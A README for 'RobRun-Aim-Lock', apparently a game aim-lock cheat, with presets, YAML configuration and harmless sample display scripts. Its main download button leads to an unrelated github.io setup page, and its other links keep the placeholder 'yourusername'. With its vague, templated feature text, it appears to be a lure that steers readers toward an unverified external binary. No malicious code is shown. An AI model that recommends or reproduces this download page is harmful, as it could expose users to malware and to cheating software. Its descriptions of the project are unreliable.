# RobRun‑Aim‑Lock  
**Author:** TigerProxy78  

*RobRun‑Aim‑Lock* is a lightweight, script‑driven utility that lets you lock onto targets with precision. Define reusable presets, chain custom scripts, and enjoy seamless integration into your workflow.

---  

## 📦 Quick Access  

<div align="center">
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download‑Release%20Page-4A90E2?style=for-the-badge&logo=chrome" alt="Download"></a>
<a href="https://github.com/yourusername/RobRun-Aim-Lock/releases"><img src="https://img.shields.io/github/v/release/yourusername/RobRun-Aim-Lock?style=for-the-badge&color=orange" alt="Latest Release"></a>
<a href="https://github.com/yourusername/RobRun-Aim-Lock/blob/main/LICENSE"><img src="https://img.shields.io/github/license/yourusername/RobRun-Aim-Lock?style=for-the-badge&color=blue" alt="License"></a>
</div>

---  

## 🔎 What Is It?

RobRun‑Aim‑Lock empowers you to:

* **Lock** onto a target with a single command.  
* **Switch** instantly between user‑defined presets (e.g., *Sniper*, *Assault*, *Stealth*).  
* **Extend** functionality with custom scripts written in PowerShell, Python, or Bash.  
* **Persist** configuration across sessions, ensuring your preferences are always ready.

---  

## 🛠️ Core Features  

| Feature | Description |
|---------|-------------|
| **Preset Engine** | Create, edit, and delete named presets that bundle coordinates, sensitivity, and script hooks. |
| **Script Hooks** | Attach pre‑ and post‑execution scripts to any preset for automated Release/cleanup. |
| **Live Config Reload** | Changes to the `config.yaml` are applied without restarting the utility. |
| **Cross‑Platform CLI** | Works on Windows, macOS, and Linux via the same command syntax. |
| **Zero‑Dependency Mode** | Optional minimal mode that runs without external libraries. |

---  

## 🚀 Getting Started  

1. **Download** the Release page using the button above.  
2. Extract the archive to a location of your choice.  
3. Open a terminal and run the core binary:  

   ```bash
   ./robrun-aim-lock --help
   ```

4. Follow the **interactive wizard** to create your first preset.  

---  

## 📂 Repository Layout  

```
RobRun-Aim-Lock/
├─ docs/               # Detailed user guides and API reference
├─ scripts/            # Sample pre‑ and post‑execution scripts
├─ config/             
│   └─ config.yaml     # Master configuration file (editable)
├─ src/                # Source code (C#, PowerShell wrappers, etc.)
├─ tests/              # Unit and integration tests
└─ README.md           # You’re here!
```

---  

## 🧩 Creating a Preset  

Add a new entry to `config/config.yaml`:

```yaml
presets:
  sniper:
    description: "Long‑range precision"
    sensitivity: 0.12
    target:
      x: 1024
      y: 768
    hooks:
      pre: scripts/prepare_sniper.ps1
      post: scripts/cleanup_sniper.sh
```

Activate it with:

```bash
robrun-aim-lock lock sniper
```

---  

## 📜 Example Scripts  

**PowerShell (pre‑hook)** – `scripts/prepare_sniper.ps1`

```powershell
# Enable high‑resolution mode
Set-DisplayResolution -Width 1920 -Height 1080 -RefreshRate 144
Write-Host "Sniper mode prepared."
```

**Bash (post‑hook)** – `scripts/cleanup_sniper.sh`

```bash
#!/usr/bin/env bash
# Restore default DPI
xrandr --output eDP-1 --dpi 96
echo "Sniper cleanup complete."
```

---  

## 🧪 Testing  

Run the full test suite with:

```bash
./run-tests.sh
```

All tests are located in the `tests/` folder and cover preset parsing, script execution, and cross‑platform behavior.

---  

## 🤝 Contributing  

Contributions are welcome! Please:

1. Fork the repo.  
2. Create a feature branch (`git checkout -b feature/awesome‑preset`).  
3. Write tests for your changes.  
4. Submit a pull request with a clear description of the enhancement.

Read the full [CONTRIBUTING.md](docs/CONTRIBUTING.md) for guidelines.

---  

## 📄 License  

Distributed under the **MIT License**. See the [LICENSE](https://github.com/yourusername/RobRun-Aim-Lock/blob/main/LICENSE) file for details.

---  

## 📣 Stay Connected  

- **Issues & Feature Requests:** <https://github.com/yourusername/RobRun-Aim-Lock/issues>  
- **Discussions:** <https://github.com/yourusername/RobRun-Aim-Lock/discussions>  

Happy targeting! 🚀